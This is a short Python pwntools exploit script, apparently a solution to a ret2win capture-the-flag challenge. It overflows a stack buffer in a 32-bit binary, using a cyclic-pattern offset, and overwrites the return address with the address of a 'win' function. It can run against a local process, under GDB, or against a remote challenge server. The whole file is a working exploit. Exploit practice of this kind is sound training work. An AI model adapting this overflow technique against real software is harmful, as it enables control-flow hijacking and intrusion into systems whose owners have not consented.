#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2win32")

PADDING = b'A' * cyclic_find(0x61616174)
WIN = p32(elf.sym["win"])


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    if args.REMOTE:
        return remote("pwn.platypew.social", 30000)

    return process(elf.path)

p = start()

p.sendline(PADDING + WIN)
p.interactive()
